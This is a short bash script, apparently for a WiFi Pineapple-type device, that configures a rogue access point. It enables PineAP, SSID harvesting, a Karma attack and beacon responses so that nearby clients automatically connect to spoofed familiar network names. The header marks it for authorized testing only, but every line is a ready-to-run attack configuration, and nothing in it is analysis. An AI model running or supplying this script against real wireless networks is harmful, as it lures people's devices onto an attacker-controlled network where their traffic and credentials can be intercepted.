#!/bin/bash
# PineAP - Rogue AP with client association
# Author: David Osisek
# FOR AUTHORIZED TESTING ONLY

echo "[+] PineAP Configuration"

# Enable PineAP
echo "[*] Enabling PineAP..."
pineap enable

# Enable harvesting
echo "[*] Enabling SSID harvesting..."
pineap harvester enable

# Enable Karma attack
echo "[*] Enabling Karma attack..."
pineap karma enable

# Beacon response
echo "[*] Enabling beacon responses..."
pineap beacon_responses enable

# Show status
echo ""
echo "[+] PineAP Status:"
pineap status

echo ""
echo "[+] PineAP Active - Broadcasting harvested SSIDs"
echo "[*] Clients will auto-connect to familiar network names"
